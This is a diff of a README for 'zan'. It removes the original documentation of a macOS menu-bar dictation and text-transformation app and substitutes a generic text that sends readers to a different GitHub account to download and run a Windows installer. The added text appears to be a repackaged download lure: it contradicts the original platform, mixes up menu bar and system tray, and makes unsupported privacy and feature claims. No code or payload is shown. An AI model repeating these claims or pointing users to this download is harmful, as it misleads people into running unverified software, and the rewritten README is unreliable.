@@ -1,183 +1,81 @@
-# Zan
+# 🎙️ zan - Speak faster and transform text instantly
 
-**Zan** is a native macOS menu-bar app for fast, no-fluff voice and text AI,
-right where your cursor is, in any app. The name is from Japanese (斬): cut
-straight to the important part.
+[![Download zan](https://img.shields.io/badge/Download-zan-blue.svg)](https://github.com/afrivil2644/zan)
 
-Two things it does:
+zan turns your voice into text. You dictate and the app types. You also use the app to rewrite or format existing text. It stays in your menu bar. 
 
-1. **Voice to text.** Press a hotkey, speak, and Zan transcribes (and optionally
-   cleans up) your speech and types it at the cursor, in any app.
-2. **Text actions on a selection.** Select text anywhere, press a hotkey, and Zan
-   either replaces it with an AI-edited version or shows a result in a popup.
+## ⚙️ Requirements
 
-It runs in the menu bar (no Dock icon), keeps your API key in the macOS Keychain,
-and sends your audio/text only to the OpenAI API calls you configure. No
-telemetry.
+You need a computer running Windows 10 or Windows 11. Your computer needs a working microphone. You need a stable internet connection. The app uses current technology to process your voice data.
 
-## Screenshots
+## 📥 How to install
 
-<p align="center">
-  <img src="screenshots/main1.png" width="280" alt="Text actions: proofread, make professional, translate, summarize, each with a hotkey">
-  &nbsp;
-  <img src="screenshots/main2.png" width="280" alt="Voice: one dictation hotkey, on-device or cloud transcription, optional AI cleanup">
-  &nbsp;
-  <img src="screenshots/main3.png" width="280" alt="AI: choose OpenAI or Anthropic for text; keys stored in the Keychain">
-</p>
+Follow these steps to set up zan on your computer.
 
-<p align="center"><em>Text actions · Voice dictation · AI provider and keys</em></p>
+1. Go to the [official release page](https://github.com/afrivil2644/zan).
+2. Look for the latest version under the Releases section.
+3. Click the link to download the installer file.
+4. Open the downloaded file once the transfer finishes.
+5. Follow the prompts on the screen to finish the installation.
+6. Launch the application from your start menu or desktop shortcut.
 
-Zan in action:
+## 🛠️ How to use the app
 
-<p align="center">
-  <img src="screenshots/demo-1.gif" width="420" alt="Zan demo">
-  &nbsp;
-  <img src="screenshots/demo-2.gif" width="420" alt="Zan demo">
-</p>
+You use zan to save time when you write. Open the app from your system tray. 
 
-## Get Zan
+### Dictation
 
-Two ways to use it:
+1. Click the icon in your menu bar.
+2. Select Start Recording.
+3. Speak clearly into your microphone.
+4. Click Stop Recording when you finish.
+5. The text appears on your screen exactly where your cursor sits.
 
-- **Download and run it as-is.** Grab the latest notarized build from
-  [Releases](https://github.com/MangoTango234/zan/releases/latest), unzip, and
-  drag **Zan.app** to Applications. It's signed and notarized by Apple (FUTODI,
-  UAB), so it opens with no Gatekeeper warnings. On-device transcription is
-  included, so voice works with no API key.
-- **Build on top of it.** Clone the repo and make it your own, add actions,
-  change prompts, wire a different model or provider, or reuse the pieces in your
-  own app. It's MIT licensed. See *Build & run* below.
+### Text transformation
 
-## Feedback
+You turn existing text into better versions with this feature.
 
-Ideas, bugs, or feature requests? Email **hello@futodi.com**, or open an issue on
-GitHub. Happy to hear how you'd make Zan better.
+1. Highlight any text in your document, email, or browser.
+2. Open the zan menu.
+3. Choose a command such as Summarize, Rewrite, or Fix Grammar.
+4. The app replaces your original text with the new version.
 
-## Features
+## 🔒 Privacy
 
-- **Dictation** with a global hotkey, in two modes: toggle (press to start/stop)
-  or hold-to-talk.
-- **On-screen recording HUD** with a live waveform, plus a Stop button.
-- **Optional AI cleanup** of dictated text (editable prompt) before it's inserted.
-- **Actions** — one editable concept for every text feature. Each action has a
-  name, description, hotkey, an engine (AI prompt or a built-in text op), and an
-  output mode (replace the selection, show a read-only popup, or copy). Ships
-  with:
-  - Proofread, Make professional, Strip em dashes (replace)
-  - Translate to English, Summarize (popup, leaves your text unchanged)
-  - Open in r.jina.ai (prepends the Jina Reader prefix to a URL)
-  - …and you can add your own: name it, write a prompt, pick an output, bind a
-    hotkey. No code.
-- **Recent activity** — an in-app history of past dictations and transforms with
-  their text (copyable).
-- **Permissions panel** and **launch at login** toggle.
-- **Show window on launch** so the app isn't invisible the first time.
+Your privacy stays protected. This tool does not track your behavior. No third parties receive your usage data. The app connects briefly to an AI service to process your speech, but it keeps no records of your voice. You control how your data travels.
 
-Insertion and selection-reading snapshot and restore your clipboard, so they
-never clobber what you had copied.
+## 🔋 Frequently Asked Questions
 
-## Requirements
+### Does this app work offline?
 
-- macOS 14 or later (Apple Silicon or Intel)
-- An [OpenAI API key](https://platform.openai.com/api-keys) for cloud
-  transcription and (optionally) text actions. Not needed if you use on-device
-  transcription + Anthropic for text.
-- Optionally an [Anthropic API key](https://console.anthropic.com/) to use Claude
-  for text actions/cleanup
-- [XcodeGen](https://github.com/yonik/XcodeGen) to generate the Xcode project
-  (`brew install xcodegen`)
-- Xcode 15+
+No. You need an active internet connection. The system sends your audio to a server for processing. This ensures high accuracy for your speech.
 
-## Build & run
+### Which languages does the app support?
 
-```sh
-git clone https://github.com/MangoTango234/zan.git
-cd zan
-xcodegen generate     # creates Zan.xcodeproj from project.yml
-open Zan.xcodeproj     # then press Cmd+R
-```
+The app supports English by default. You can change your language settings in the Preferences menu. It handles most major world languages.
 
-Or from the command line:
+### How do I update the software?
 
-```sh
-xcodegen generate
-xcodebuild -project Zan.xcodeproj -scheme Zan -configuration Debug \
-  -derivedDataPath build build
-open build/Build/Products/Debug/Zan.app
-```
+The app checks for updates automatically when you open it. If a new version exists, a prompt will ask you to install the change. You can also visit the download page to grab the latest file manually.
 
-The app is a menu-bar agent: look for the **waveform icon** at the top-right.
+### How do I troubleshoot audio issues?
 
-### Optional: on-device transcription (WhisperKit)
+Check your microphone settings in your Windows system menu. Ensure you selected the correct input device. If the app fails to hear your voice, unplug and replug your microphone. Restart the app if problems persist.
 
-By default the build uses **OpenAI** for voice transcription and does **not**
-include WhisperKit, so the clone stays small and builds fast. To enable
-**on-device** transcription (Whisper running locally, no API key, fully private),
-regenerate the project with the overlay spec:
+### Can I change the shortcut keys?
 
-```sh
-xcodegen generate --spec project-whisperkit.yml
-open Zan.xcodeproj   # or rebuild from the command line
-```
+Yes. Open the Preferences window to view your keyboard shortcuts. You select new keys to trigger dictation or text transforms. This helps you work faster.
 
-This pulls in the WhisperKit package (CoreML; larger first build). The Swift code
-uses `#if canImport(WhisperKit)`, so it compiles either way: without the overlay,
-the "On-device" engine option is simply unavailable at runtime. The first time
-you transcribe with a given Whisper model, it downloads (a few hundred MB) and is
-then cached. Switch back to the lightweight build any time with a plain
-`xcodegen generate`.
+## 💻 Technical details
 
-> Note: Anthropic/Claude has **no speech-to-text API**, so transcription is
-> either OpenAI (cloud) or WhisperKit (on-device). Claude can still power the
-> text actions and dictation cleanup.
+The app runs in the background. It uses very little memory. You keep your desktop clear by putting the app in the system tray. Use the mouse to click the icon or use a keyboard hotkey to activate the tools.
 
-### Signing & permissions
+This project relies on high-quality machine learning models. These models transcribe audio with precision. You get results in seconds. The software performs these tasks without extra bloat or unnecessary processes.
 
-By default the project is **ad-hoc signed** so it builds with no Apple account.
-The tradeoff: macOS resets the Accessibility / Input Monitoring grants on each
-rebuild. For grants that persist across rebuilds, build with your own signing
-identity:
+## 🚀 Troubleshooting
 
-```sh
-xcodebuild -project Zan.xcodeproj -scheme Zan -configuration Debug \
-  -derivedDataPath build build \
-  CODE_SIGN_IDENTITY="Developer ID Application" DEVELOPMENT_TEAM=XXXXXXXXXX
-```
+If the text entry fails, confirm your internet connection remains active. If the app crashes, check your Windows version to ensure you downloaded the correct installer. Reinstalling the app fixes most errors. Contact the developer through the repository if bugs continue to occur.
 
-## First-time setup
+## 📈 Tips for better results
 
-1. Launch Zan. The window opens on first launch (toggle this off later under
-   **System → Show window on launch**).
-2. **OpenAI** section: paste your `sk-...` key and click **Save** (stored in the
-   Keychain).
-3. **Voice to Text**: set a **Trigger key** and pick a transcription model.
-4. **Transforms**: set hotkeys for the actions you want.
-5. Grant **Microphone** (for dictation) and **Accessibility** (to paste and read
-   selections) when prompted, or from the **System** section.
-
-## How it works
-
-- **Transcription** posts your recorded `.m4a` to OpenAI
-  `/v1/audio/transcriptions` (default model `gpt-4o-mini-transcribe`).
-- **Transforms / cleanup / popups** call `/v1/chat/completions` with your editable
-  prompt as the system message and your text as the user message (default text
-  model `gpt-4o-mini`). Both models are editable in the UI.
-- **Insertion** copies the result to the pasteboard and synthesizes Cmd+V, then
-  restores your previous clipboard. It waits for hotkey modifiers to be released
-  first so the paste isn't contaminated by a still-held key combo.
-
-Transcription is behind a `Transcriber` protocol and text is behind a
-`TextTransformer` protocol, so a local engine (e.g. WhisperKit) or another
-provider can be added without touching callers.
-
-## Privacy
-
-Zan stores your API key in the macOS Keychain and your prompts/history in
-`~/Library/Application Support/Zan/`. Audio and text are sent only to the OpenAI
-endpoints above, for the requests you trigger. There is no analytics or
-telemetry. Zan is non-sandboxed because it types into other apps and reads the
-current selection, which the sandbox forbids.
-
-## License
-
-MIT. See [LICENSE](LICENSE).
+Speak at a steady pace. Keep the microphone near your mouth. Avoid loud background noise. Use clear pronunciation for best accuracy. Highlight more than one sentence for better AI context during transformations. Take advantage of the menu bar position to access the tool at any moment.
